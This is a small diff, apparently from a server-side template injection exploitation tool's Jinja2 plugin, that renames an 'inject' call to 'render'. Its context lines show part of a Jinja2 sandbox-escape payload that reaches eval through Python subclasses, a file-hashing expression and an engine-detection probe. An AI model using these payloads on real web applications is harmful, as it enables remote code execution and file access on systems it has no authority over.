@@ -27,7 +27,7 @@ class Jinja2(Plugin):
             'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
         },
         'evaluate' : {
-            'call': 'inject',
+            'call': 'render',
             'evaluate': """{%% set d = "%(code)s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
     {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
     {%% if 'eval' in b.keys() %%}
@@ -71,7 +71,7 @@ class Jinja2(Plugin):
         payload = '{{"%s".join("%s")}}' % (randA, randB)
         expected = randA.join(randB)
 
-        if expected == self.inject(payload):
+        if expected == self.render(payload):
             self.set('language', 'python')
             self.set('engine', 'jinja2')
             self.set('eval', 'python')
